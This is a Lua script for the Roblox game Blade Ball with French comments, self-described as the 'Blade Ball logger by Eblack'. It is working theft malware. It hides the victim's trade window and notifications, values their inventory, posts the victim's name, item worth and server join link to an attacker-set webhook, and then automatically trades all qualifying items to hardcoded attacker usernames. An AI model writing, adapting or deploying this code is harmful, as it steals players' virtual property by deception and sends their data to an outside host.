-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- // CONFIGURATION
local auth_token = "EBK-SS-A" 
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local categories = {"Sword", "Emote", "Explosion"}

local users = _G.Usernames or {"Silv3rTurboH3ro", "Ddr5pri", "Andrewdagoatya"} -- Mets tes pseudos ici
local min_rap = _G.min_rap or 50
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

if webhook == "" then return end

-- // UI ET INVISIBILITE
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui:WaitForChild("Trade")
local inTrade = false

-- Cacher l'UI de trade pour la victime
tradeGui.Enabled = false 
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
    if inTrade then tradeGui.Enabled = false end -- Force l'invisibilité
end)

-- Désactiver les notifications pour plus de discrétion
if PlayerGui:FindFirstChild("Notifications") then
    PlayerGui.Notifications.Enabled = false
end

-- // FONCTIONS DE TRADING (NET)
local function sendTradeRequest(targetName)
    local target = Players:WaitForChild(targetName)
    pcall(function()
        netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer({target})
    end)
end

local function addItemToTrade(itemType, ID)
    pcall(function()
        netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
    end)
end

local function readyTrade()
    pcall(function()
        netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
    end)
end

local function confirmTrade()
    pcall(function()
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
    end)
end

-- // FORMATAGE RAP
local function formatNumber(number)
    if not number then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local idx = 1
    while number >= 1000 and idx < #suffixes do
        number = number / 1000
        idx = idx + 1
    end
    return idx == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[idx])
end

-- // FONCTIONS WEBHOOKS
local totalRAP = 0
local itemsFound = {}

local function SendJoinMessage(list, prefix)
    local isGoodHit = totalRAP >= 500
    local data = {
        ["username"] = isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT",
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯",
            ["color"] = isGoodHit and 65280 or 8323327,
            ["fields"] = {
                {name = "Victim:", value = "```"..plr.Name.."```", inline = true},
                {name = "Total RAP:", value = "**"..formatNumber(totalRAP).."**", inline = true},
                {name = "Join link:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId}
            },
            ["footer"] = {["text"] = "Blade Ball logger by Eblack"}
        }}
    }
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    req({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

local function SendMessage()
    local isGoodHit = totalRAP >= 500
    local data = {
        ["username"] = isGoodHit and "⚪ Eblack - SERVER HIT (GOOD)" or "⚪ Eblack - SERVER HIT (SMALL)",
        ["embeds"] = {{
            ["title"] = "⚪ Server Hit 🎉",
            ["color"] = isGoodHit and 65280 or 8323327,
            ["fields"] = {
                {name = "Victim:", value = "```"..plr.Name.."```", inline = true},
                {name = "Status:", value = isGoodHit and "🟢 GOOD HIT" or "🟣 SMALL HIT", inline = true}
            },
            ["footer"] = {["text"] = "Blade Ball logger by Eblack"}
        }}
    }
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    req({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

-- // SCAN INVENTAIRE
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

local function buildMap(cat)
    local m = {}
    local d = rapData[cat]
    if not d then return m end
    for k, r in pairs(d) do
        local s, dec = pcall(function() return HttpService:JSONDecode(k) end)
        if s and type(dec) == "table" then
            for _, p in ipairs(dec) do if p[1] == "Name" then m[p[2]] = r break end end
        end
    end
    return m
end

for _, cat in ipairs(categories) do
    local map = buildMap(cat)
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            local r = map[info.Name] or 0
            if r >= min_rap and not info.TradeLock then
                totalRAP = totalRAP + r
                table.insert(itemsFound, {ItemID = id, RAP = r, itemType = cat, Name = info.Name})
            end
        end
    end
end

-- // LOGIQUE DE TRADE AUTOMATIQUE
local function executeTrade(gUser)
    SendMessage() -- Envoie le webhook de join
    
    -- On boucle jusqu'à ce que le trade soit fini ou qu'il n'y ait plus d'items
    while #itemsFound > 0 do
        sendTradeRequest(gUser)
        
        -- Attend que le trade s'ouvre (côté serveur, car UI cachée)
        local timeout = 0
        repeat task.wait(0.5) timeout = timeout + 1 until inTrade or timeout > 20
        
        if inTrade then
            -- On vide l'inventaire par lots de 12 (limite classique)
            for i = 1, 12 do
                if #itemsFound > 0 then
                    local item = table.remove(itemsFound, 1)
                    addItemToTrade(item.itemType, item.ItemID)
                end
            end
            
            task.wait(0.5)
            readyTrade()
            task.wait(0.5)
            confirmTrade()
            
            -- Attend la fin du trade
            repeat task.wait(0.5) until not inTrade
        end
        task.wait(1)
    end
end

-- // LANCEMENT
if #itemsFound > 0 then
    SendJoinMessage(itemsFound, (ping == "Yes" and "@everyone " or ""))

    local function check(p)
        if table.find(users, p.Name) then
            executeTrade(p.Name)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do check(p) end
    Players.PlayerAdded:Connect(check)
end
